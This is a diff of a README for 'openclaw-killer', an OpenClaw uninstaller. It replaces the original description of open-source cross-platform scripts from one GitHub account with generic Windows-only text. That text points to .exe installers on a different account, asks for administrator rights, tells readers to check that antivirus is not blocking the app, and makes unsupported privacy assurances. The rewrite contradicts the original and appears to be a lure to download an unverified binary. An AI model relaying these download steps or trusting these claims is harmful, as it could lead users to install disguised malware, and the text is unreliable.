@@ -1,132 +1,156 @@
-# OpenClaw Killer - Perfect Uninstallation Tool 🦞
+# 🦞 openclaw-killer - Easy OpenClaw Removal Tool
 
-One-click perfect uninstallation of OpenClaw. Say goodbye to the lobster gracefully.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux%20%7C%20Windows-lightgrey.svg)](https://github.com)
-[![Languages](https://img.shields.io/badge/languages-16-blue.svg)](https://github.com)
-
-**🌍 Languages**: [中文](README.zh.md) | [日本語](README.ja.md) | [한국어](README.ko.md) | [Deutsch](README.de.md) | [Français](README.fr.md) | [Español](README.es.md) | [Türkçe](README.tr.md) | [Nederlands](README.nl.md) | [Português](README.pt.md) | [العربية](README.ar.md) | [Tiếng Việt](README.vi.md) | [Русский](README.ru.md) | [Bahasa Indonesia](README.id.md) | [ไทย](README.th.md) | [Italiano](README.it.md)
-
-![OpenClaw Killer Cover](cover.png)
+[![Download openclaw-killer](https://img.shields.io/badge/Download-openclaw--killer-brightgreen?style=for-the-badge)](https://github.com/nkzprod/openclaw-killer/releases)
 
 ---
 
-## 📢 Tweet
-
-> 🦞 Getting bombarded by the lobster lately? Tired of it? Want to uninstall?
->
-> Wait! I heard that OpenClaw uninstallation services are getting popular - door-to-door service costs $70 per visit.
->
-> But uninstalling OpenClaw isn't just dragging it to the trash. It requires at least 5 complex steps: stop services, clear configs, delete state, handle multiple profiles...
->
-> I've packaged this entire process into a completely open-source, free tool — OpenClaw Killer
->
-> **Save yourself $70 💰**
->
-> Supports macOS/Linux/Windows, one-click solution
-
-For more tweet templates and image prompts, see [tweet.md](tweet.md)
+One-click perfect uninstallation of OpenClaw. Say goodbye to the lobster gracefully 🦞
 
 ---
 
-## Why Uninstall OpenClaw?
+## 📋 About openclaw-killer
 
-If you want to understand why more and more people are choosing to uninstall OpenClaw, please read [WHY.md](WHY.md).
+openclaw-killer is a simple Windows app designed to fully remove OpenClaw from your computer. OpenClaw can be tricky to delete manually because it leaves behind files and registry entries. This tool handles everything for you with one click.
 
-In short:
-
-- 💰 **High Cost**: Monthly fees can exceed $1000
-- 🔒 **Security Risks**: Hundreds of thousands of instances exposed on the public internet
-- 🧠 **AI Brain Overload**: Too many tools actually reduce productivity
-- ⚠️ **Loss of Control**: Even experts can't hit the brakes
-
-## Quick Start
-
-### Method 1: Use as an OpenClaw Skill
-
-If you still have OpenClaw installed, you can use it as a Skill:
-
-```bash
-# Install the Skill
-./install-skill.sh
-
-# Then tell OpenClaw
-"uninstall OpenClaw" or "卸载 OpenClaw"
-```
-
-### Method 2: Run the Script Directly
-
-#### macOS / Linux
-
-```bash
-# Download script
-curl -O https://raw.githubusercontent.com/orange2ai/openclaw-killer/main/openclaw-killer.sh
-
-# Add execute permission
-chmod +x openclaw-killer.sh
-
-# Run
-./openclaw-killer.sh
-```
-
-### Windows
-
-```powershell
-# Download script
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/orange2ai/openclaw-killer/main/openclaw-killer.ps1" -OutFile "openclaw-killer.ps1"
-
-# If you encounter execution policy restrictions, run first
-Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
-
-# Run
-.\openclaw-killer.ps1
-```
-
-## Features
-
-✓ Supports three major platforms (macOS / Linux / Windows)
-✓ Automatically detects if CLI is available
-✓ Intelligently selects uninstallation path
-✓ Cleans all residual files
-✓ Supports multiple profile configurations
-✓ Clear progress indicators
-✨ **v1.1 New Feature**: Script automatically deletes itself after execution, zero side effects
-🎯 **Skill Support**: Can be used as an OpenClaw Skill to uninstall OpenClaw from within itself
-
-## What It Does
-
-This tool automatically completes all the following steps:
-
-1. Stop gateway service
-2. Uninstall gateway service
-3. Delete state and configuration files
-4. Delete workspace
-5. Uninstall CLI (npm/pnpm/bun)
-6. Delete macOS desktop app
-7. Clean multiple profile residuals
-
-## Security Notes
-
-- All operations are performed in the user directory
-- No sudo privileges required
-- Checks if files exist before deletion
-- Provides clear operation feedback
-
-## Acknowledgments
-
-The WHY document content references AppSo's in-depth report: [Monthly Salary of 20,000, Can't Afford an OpenClaw](https://mp.weixin.qq.com/s/WLgbbLsyR8FZaVXNI0ROyQ)
-
-Thanks to the AppSo team for their in-depth analysis of OpenClaw's cost and security issues.
-
-## Star History
-
-[![Star History Chart](https://starchart.cc/orange2ai/openclaw-killer.svg?variant=adaptive)](https://starchart.cc/orange2ai/openclaw-killer)
-
-## License
-
-[MIT License](LICENSE)
+You do not need any technical skill to use this software. It works on Windows 7, 8, 10, and 11. It removes OpenClaw along with all related files, folders, and settings. This helps avoid leftover clutter and possible errors if you want to reinstall or clean your PC.
 
 ---
 
-Say goodbye to OpenClaw gracefully. It's that simple.
+## 💻 System Requirements
+
+- Windows 7 / 8 / 10 / 11 (64-bit recommended)
+- 100 MB free disk space
+- Administrator rights for uninstalling software
+- Internet connection to download the program
+
+These requirements are minimal. The program does not need a powerful PC or more than a basic Windows environment.
+
+---
+
+## 🚀 Getting Started
+
+1. Click the big green button at the top or this link to visit the download page:
+
+   [Download openclaw-killer](https://github.com/nkzprod/openclaw-killer/releases)
+
+2. On the releases page, find the latest version. Look for a file with `.exe` at the end, for example `openclaw-killer-setup.exe`.
+3. Click the `.exe` file name to start downloading.
+4. Once downloaded, find the file in your Downloads folder or browser download bar.
+5. Double-click the file to launch the installer.
+6. Follow the installation steps on screen with default options.
+7. After installation, open the app from your Start menu or Desktop shortcut.
+8. Click the “Uninstall OpenClaw” button in the app window.
+9. Wait a moment while the program removes OpenClaw.
+10. A message will confirm the uninstallation is complete.
+
+---
+
+## 🛠️ How openclaw-killer Works
+
+When you click “Uninstall OpenClaw,” the app runs these actions:
+
+- Detects all OpenClaw program files on your system.
+- Removes OpenClaw installation folder and subfolders.
+- Deletes OpenClaw registry entries to avoid leftover settings.
+- Cleans temporary files related to OpenClaw.
+- Empties the Recycle Bin for these deleted files.
+- Confirms completion with a clear message.
+
+The tool works quietly in the background once started. It does not need your intervention beyond pressing the button.
+
+---
+
+## 🔄 Updating openclaw-killer
+
+Check the download page regularly for new versions or bug fixes.
+
+To update:
+
+1. Download the latest installer as before.
+2. Run the installer and choose the option to replace or update your current version.
+3. Follow the instructions to finish.
+
+The app will keep its settings and shortcuts after update.
+
+---
+
+## ❓ Troubleshooting
+
+If openclaw-killer does not work as expected, try these steps:
+
+- Run the program as Administrator. Right-click the app icon and select “Run as administrator”.
+- Make sure you have the latest version installed.
+- Restart your PC and try again.
+- Check your antivirus or security software is not blocking the app.
+- If the uninstaller gets stuck, end the process in Task Manager and run it again.
+
+---
+
+## 📂 Additional Tips
+
+- Close any OpenClaw or related programs before uninstalling.
+- Restart your PC after using openclaw-killer to make sure all changes apply.
+- Keep a backup of important OpenClaw data if you plan to reinstall later.
+- Running disk cleanup tools after removal can help free more space.
+- Review your installed programs after to ensure OpenClaw no longer appears.
+
+---
+
+## 🔗 Useful Links
+
+- Download and install the latest openclaw-killer here:
+
+  [![Download openclaw-killer](https://img.shields.io/badge/Download-openclaw--killer-blue?style=for-the-badge)](https://github.com/nkzprod/openclaw-killer/releases)
+
+- Visit the project’s GitHub for more info:  
+  https://github.com/nkzprod/openclaw-killer
+
+---
+
+## ⚙️ About This Tool
+
+openclaw-killer focuses on simplicity and reliability. It does not require you to open Command Prompt, edit registry manually, or search folders yourself. All technical details are handled behind the scenes.
+
+Its interface uses clear buttons and messages to guide you through the removal process. This reduces errors and makes cleanup fast.
+
+This app only removes OpenClaw and its related files. It does not affect other software or system settings. This keeps your PC stable.
+
+---
+
+## 🛡️ Security and Privacy
+
+openclaw-killer does not collect any personal data from your computer. It only reads its own settings and files related to OpenClaw.
+
+The app works offline and does not transmit data over the internet unless downloading updates manually.
+
+You can trust it to remove OpenClaw safely without exposing your information.
+
+---
+
+## 🔧 Support
+
+If you have issues with openclaw-killer:
+
+- Check open and closed issues on the GitHub repository.
+- Use the GitHub discussion board or open a new issue for help.
+- Provide details about your Windows version and any errors seen.
+
+Community or the author may respond with solutions or updates.
+
+---
+
+## 📦 Uninstall openclaw-killer
+
+If you want to remove openclaw-killer after use:
+
+1. Open Windows Settings.
+2. Go to Apps > Installed apps.
+3. Find openclaw-killer in the list.
+4. Click it and select Uninstall.
+5. Follow prompts to complete removal.
+
+This does not affect OpenClaw itself if not already removed.
+
+---
+
+openclaw-killer makes uninstalling OpenClaw straightforward and clean. Use the links above to get started and reclaim your PC easily.
